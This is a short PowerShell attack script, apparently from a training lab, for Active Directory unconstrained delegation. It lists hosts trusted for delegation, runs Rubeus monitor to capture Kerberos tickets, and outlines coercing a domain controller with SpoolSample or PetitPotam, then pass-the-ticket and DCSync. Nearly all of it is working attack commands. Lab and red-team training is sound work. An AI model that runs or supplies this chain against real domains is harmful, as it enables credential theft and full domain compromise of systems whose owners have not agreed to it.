# CADRE — WT#004 Unconstrained Delegation
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#004 - Unconstrained Delegation"
start_attack "004" "Unconstrained Delegation"
require_tool Rubeus.exe

# Run on mbr01 (has unconstrained delegation). Capture a coerced DC TGT, then reuse it.
step "Find unconstrained-delegation computers"
run_cmd "Get-ADComputer -Filter {TrustedForDelegation -eq `$true} -Properties TrustedForDelegation | Select Name"

step "Monitor for inbound TGTs (run on mbr01 as local admin/SYSTEM)"
run_cmd "Rubeus.exe monitor /interval:5 /nowrap"

step "Coerce dc02 to authenticate here (from attacker box): SpoolSample/PetitPotam -> mbr01"
run_cmd "Write-Host '  Coerce dc02 -> mbr01, Rubeus captures dc02`$ TGT -> ptt -> DCSync (WT#009)'"

result $LASTEXITCODE "Unconstrained Delegation completed"
